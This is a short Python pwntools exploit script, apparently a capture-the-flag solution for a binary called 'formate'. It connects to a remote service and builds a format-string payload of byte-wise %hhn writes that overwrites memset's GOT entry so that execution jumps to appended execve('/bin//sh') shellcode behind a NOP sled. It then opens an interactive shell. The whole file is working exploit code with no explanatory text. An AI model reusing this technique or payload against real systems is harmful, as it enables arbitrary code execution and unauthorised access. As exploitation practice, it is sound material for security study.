#!/usr/bin/env python

from pwn import *

# p = process("./formate")
p = remote("118.89.138.44", 30006)
context.log_level="debug"
#gdb.attach(proc.pidof(p)[0])

shellcode = "\x90" * 0x100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

memset_got = 0x8049130
shellcode_addr = 0x8049180 + 0x100

def get_number(printed, target):
    if printed > target:
        return 256 - printed + target
    elif printed == target:
        return 0
    else:
        return target - printed

def write_memery(target, data, offset):
    lowest = data >> 8 * 3 & 0xFF
    low = data >> 8 * 2 & 0xFF
    high = data >> 8 * 1 & 0xFF
    highest = data >> 8 * 0 & 0xFF
    printed = 0
    payload = p32(target + 3) + p32(target + 2) + p32(target + 1) + p32(target + 0)
    length_lowest = get_number(len(payload), lowest)
    length_low = get_number(lowest, low)
    length_high = get_number(low, high)
    length_highest = get_number(high, highest)
    payload += '%' + str(length_lowest) + 'c' + '%' + str(offset) + '$hhn'
    payload += '%' + str(length_low) + 'c' + '%' + str(offset + 1) + '$hhn'
    payload += '%' + str(length_high) + 'c' + '%' + str(offset + 2) + '$hhn'
    payload += '%' + str(length_highest) + 'c' + '%' + str(offset + 3) + '$hhn'
    return payload

payload = write_memery(memset_got, shellcode_addr, 7) + shellcode
print repr(payload)

p.readuntil("input your choice:\n")
p.sendline("2")
p.readuntil("input your message\n")
p.sendline(payload)
p.sendline("3")
p.sendline("2")
p.interactive()

